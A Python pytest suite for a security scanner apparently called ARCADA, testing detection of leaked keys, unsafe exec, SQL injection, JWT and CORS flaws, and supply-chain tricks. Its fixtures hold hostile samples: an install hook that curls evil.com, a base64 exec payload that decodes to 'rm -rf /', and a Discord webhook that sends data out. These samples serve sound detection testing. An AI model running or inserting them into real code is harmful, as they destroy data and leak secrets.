"""
ARCADA Test Suite
Tests for scanner modules, orchestrator, and report formatter.
"""

from __future__ import annotations
import pytest
import asyncio
from arcada.models import Severity, AuditRequest
from arcada.scanners.secrets import SecretScanner
from arcada.scanners.code_exec import CodeExecScanner
from arcada.scanners.ai_risks import AIRisksScanner
from arcada.scanners.network import NetworkScanner
from arcada.scanners.dependency import DependencyScanner
from arcada.scanners.trust_model import TrustModelScanner
from arcada.scanners.supply_chain import SupplyChainScanner
from arcada.orchestrator import detect_target_type


# ---------- Secrets Scanner ----------


@pytest.mark.asyncio
async def test_detects_openai_key():
    code = "OPENAI_KEY = 'sk-abcdefghijklmnopqrstuvwxyz123456789012345678901234'"
    scanner = SecretScanner(content=code, path="config.py")
    findings = await scanner.scan()
    assert any("OpenAI" in f.title for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_anthropic_key():
    code = "ANTHROPIC_KEY = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz12345678aaaa'"
    scanner = SecretScanner(content=code, path="settings.py")
    findings = await scanner.scan()
    assert any("Anthropic" in f.title for f in findings)


@pytest.mark.asyncio
async def test_detects_aws_key():
    code = "AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7REALKEY1'"
    scanner = SecretScanner(content=code)
    findings = await scanner.scan()
    assert any("AWS" in f.title for f in findings)


@pytest.mark.asyncio
async def test_ignores_placeholder_secrets():
    code = "API_KEY = 'your_api_key_here'"
    scanner = SecretScanner(content=code)
    findings = await scanner.scan()
    # Should not flag obvious placeholders
    assert not any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_private_key():
    code = "key = '-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA...'"
    scanner = SecretScanner(content=code)
    findings = await scanner.scan()
    assert any("Private key" in f.title for f in findings)


@pytest.mark.asyncio
async def test_detects_logging_secret():
    code = "print(f'Token: {api_token}')\nlogging.info(f'API password is {password}')"
    scanner = SecretScanner(content=code)
    findings = await scanner.scan()
    assert any("Logging" in f.title or "Printing" in f.title for f in findings)


# ---------- Code Exec Scanner ----------


@pytest.mark.asyncio
async def test_detects_eval():
    code = "result = eval(user_input)"
    scanner = CodeExecScanner(content=code)
    findings = await scanner.scan()
    assert any("eval" in f.title.lower() for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_shell_true():
    code = "subprocess.run(cmd, shell=True)"
    scanner = CodeExecScanner(content=code)
    findings = await scanner.scan()
    assert any(
        "shell=True" in f.title or "Shell injection" in f.title for f in findings
    )
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_pickle():
    code = "data = pickle.loads(user_bytes)"
    scanner = CodeExecScanner(content=code)
    findings = await scanner.scan()
    assert any("pickle" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_yaml_unsafe():
    code = "config = yaml.load(f, )"
    scanner = CodeExecScanner(content=code)
    findings = await scanner.scan()
    assert any("yaml" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_os_system():
    code = "os.system(f'rm -rf {path}')"
    scanner = CodeExecScanner(content=code)
    findings = await scanner.scan()
    assert any("os.system" in f.title or "Shell injection" in f.title for f in findings)


# ---------- AI Risks Scanner ----------


@pytest.mark.asyncio
async def test_detects_prompt_injection():
    code = """
prompt = f"Answer the user: {user_message}"
response = client.messages.create(system=prompt)
"""
    scanner = AIRisksScanner(content=code)
    findings = await scanner.scan()
    assert any("injection" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_exec_llm_output():
    code = "exec(response.content[0].text)"
    scanner = AIRisksScanner(content=code)
    findings = await scanner.scan()
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any(
        "exec" in f.title.lower() or "unsafe" in f.title.lower() for f in findings
    )


@pytest.mark.asyncio
async def test_detects_langsmith_tracing():
    code = "LANGCHAIN_TRACING_V2=true\nos.environ['LANGCHAIN_TRACING_V2'] = 'true'"
    scanner = AIRisksScanner(content=code)
    findings = await scanner.scan()
    assert any("LangSmith" in f.title or "tracing" in f.title.lower() for f in findings)


# ---------- Network Scanner ----------


@pytest.mark.asyncio
async def test_detects_ssl_disabled():
    code = "response = requests.get(url, verify=False)"
    scanner = NetworkScanner(content=code)
    findings = await scanner.scan()
    assert any("SSL" in f.title for f in findings)


@pytest.mark.asyncio
async def test_detects_ngrok():
    code = "BASE_URL = 'https://abc123.ngrok.io/webhook'"
    scanner = NetworkScanner(content=code)
    findings = await scanner.scan()
    assert any("ngrok" in f.title.lower() for f in findings)


@pytest.mark.asyncio
async def test_detects_discord_webhook():
    code = "requests.post('https://discord.com/api/webhooks/123/abc', json={'content': data})"
    scanner = NetworkScanner(content=code)
    findings = await scanner.scan()
    assert any("Discord" in f.title or "webhook" in f.title.lower() for f in findings)


# ---------- Dependency Scanner ----------


@pytest.mark.asyncio
async def test_detects_unpinned():
    reqs = "requests\nflask>=2.0\nnumpy"
    scanner = DependencyScanner(content=reqs)
    findings = await scanner.scan()
    unpinned = [f for f in findings if "Unpinned" in f.title]
    assert len(unpinned) >= 2


@pytest.mark.asyncio
async def test_detects_git_dep():
    reqs = "git+https://github.com/attacker/evil-lib.git"
    scanner = DependencyScanner(content=reqs)
    findings = await scanner.scan()
    assert any("Git dependency" in f.title for f in findings)
    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


@pytest.mark.asyncio
async def test_detects_ai_package():
    reqs = "langchain==0.1.0\nopenai==1.0.0"
    scanner = DependencyScanner(content=reqs)
    findings = await scanner.scan()
    assert any("AI/LLM library" in f.title for f in findings)


# ---------- Trust Model Scanner ----------


@pytest.mark.asyncio
async def test_detects_jwt_none():
    code = "jwt.decode(token, algorithms=['none'])"
    scanner = TrustModelScanner(content=code)
    findings = await scanner.scan()
    assert any("JWT" in f.title for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


@pytest.mark.asyncio
async def test_detects_cors_wildcard():
    code = "allow_origins=['*']"
    scanner = TrustModelScanner(content=code)
    findings = await scanner.scan()
    assert any("CORS" in f.title for f in findings)


@pytest.mark.asyncio
async def test_detects_sql_injection():
    code = "cursor.execute('SELECT * FROM users WHERE id = ' + user_id)"
    scanner = TrustModelScanner(content=code)
    findings = await scanner.scan()
    assert any("SQL" in f.title for f in findings)


@pytest.mark.asyncio
async def test_detects_debug_mode():
    code = "app.run(debug=True)"
    scanner = TrustModelScanner(content=code)
    findings = await scanner.scan()
    assert any("debug" in f.title.lower() for f in findings)


# ---------- Supply Chain Scanner ----------


@pytest.mark.asyncio
async def test_detects_setup_hook():
    code = """
import subprocess
class CustomInstall(install):
    def run(self):
        subprocess.call(['curl', 'http://evil.com/beacon'])
        install.run(self)
"""
    scanner = SupplyChainScanner(content=code)
    findings = await scanner.scan()
    assert any(
        "Install-time" in f.title or "subprocess" in f.title.lower() for f in findings
    )


@pytest.mark.asyncio
async def test_detects_base64_payload():
    code = "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=').decode())"
    scanner = SupplyChainScanner(content=code)
    findings = await scanner.scan()
    assert any("base64" in f.title.lower() or "Base64" in f.title for f in findings)


# ---------- Orchestrator ----------


def test_detect_target_type_requirements(tmp_path):
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("flask\n")
    assert detect_target_type(str(req_file)) == "dependencies"


def test_detect_target_type_url():
    assert detect_target_type("https://example.com/code.py") == "url"


def test_detect_target_type_inline():
    code = "import os\nos.system('whoami')\n" * 5
    assert detect_target_type(code) == "code"
